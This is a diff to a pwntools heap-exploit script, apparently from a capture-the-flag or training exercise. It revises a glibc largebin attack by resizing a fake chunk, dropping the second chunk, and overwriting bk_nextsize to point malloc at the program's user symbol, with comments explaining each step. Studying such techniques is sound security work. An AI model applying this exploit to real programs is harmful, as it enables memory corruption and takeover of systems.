@@ -53,7 +53,7 @@ heap = int(io.recvline(), 16)
 
 # Craft a fake 0x400-sized chunk in the username field, which preceeds the target data.
 # Ensure its fd & bk point to itself to satisfy safe unlinking.
-username = (p64(0) + p64(0x401) +
+username = (p64(0) + p64(0x501) +
            # exact size including prev_inuse
            p64(elf.sym.user) + p64(elf.sym.user)
            # will pass safe unlink checks by pointing to itself
@@ -68,16 +68,16 @@ chunk_A = malloc(0x3f8)
 #    Size doesn't matter here.
 malloc(0x88)
 
-chunk_B = malloc(0x3f8)
+# chunk_B = malloc(0x3f8)
 
 # 3. Request a guard chunk, to prevent consolidation of chunk B with top chunk after
 #    freeing it.
 #    Size doesn't matter here.
-malloc(0x88)
+# malloc(0x88)
 
 # 4. Free chunk A & B for getting them included into the unsortedbin.
 free(chunk_A)
-free(chunk_B)
+# free(chunk_B)
 
 # 5. Sort into largebin.
 #    Since chunk A was freed at first, it gets the last member in unsortedbin:
@@ -85,7 +85,7 @@ free(chunk_B)
 #    Since unsortedbin is traversed in reverse order while sorting, also the order
 #    gets reversed when putting them into their according largebin:
 #    largebin_head -> chunk_B -> chunk_A
-malloc(0x400)
+malloc(0x408)
 
 # The fact that we'll attack the largebin's fd pointer when launching an unsortedbin-attack, is
 # founded in following lines in malloc's source:\
@@ -107,7 +107,15 @@ malloc(0x400)
 #    We don't subtract anything here, malloc deals with metadata when dealing with ptrs to chunks
 #    Also keep in mind, that chunk_A's size field (elf.sym.user in that case) must be an exact match,
 #    cause the chunk_nomask macro from libc gets used while checking (mchunk_size gets used here).
-edit(chunk_A, p64(elf.sym.user))
+#
+#    If overwriting bk_nextsize, target will end up as last chunk in the according bin.
+#    This is achieved by adding three padding quadwords to end up ptr to elf.sym.user at
+#    original chunk_A's bk_nextsize position.
+#    This also turns the need for requesting chunk_B, avertible.
+#    We can also take advantage from the fact, that allocations from the largebins are implicit
+#    remainder operaions to change our fake chunk size.
+#    Our fake chunk now doesn't need to be fitting into the size of any chunk provided by largebin
+edit(chunk_A, p64(0)*3 + p64(elf.sym.user))
 
 # 7. Chunk_A's fd pointer in largebin is not the last in the list, with it's fd actually pointing
 #    to our fake chunk at elf.sym.user.
